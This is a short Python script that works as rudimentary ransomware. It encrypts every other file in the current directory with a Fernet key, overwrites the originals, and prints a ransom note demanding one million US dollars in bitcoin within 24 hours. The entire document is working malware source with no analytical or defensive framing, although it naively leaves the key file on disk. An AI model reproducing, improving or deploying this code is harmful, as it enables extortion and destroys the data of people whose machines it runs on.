import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "encrypt.py" or file == "decrypt.py" or file == "thekey.key":
                continue
        if os.path.isfile(file):  
                files.append(file)

key = Fernet.generate_key()

with open("thekey.key", 'wb') as thekey:
        thekey.write(key)


for file in files:
        with open(file, 'rb') as thefile:
                contents = thefile.read()

        encrypted_contents = Fernet(key).encrypt(contents)

        with open(file, 'wb') as  thefile:
                thefile.write(encrypted_contents)
print("\t\t\t\t\t\t\t*****YOU ARE HACKED*****\n\n")
print("*******FOR YOUR FILES TO BE DECRYPTED SEND 1000000USD TO THIS BITCOIN ACCOUNT 'JSFGJDSFGHDFG' I WILL SEND YOUU A PASSCODE*******\n\n")
print("\t\t\t\t\t\t\t*****WITHIN 24HRS !!! CLOCK IS TIKING*****\n\n")
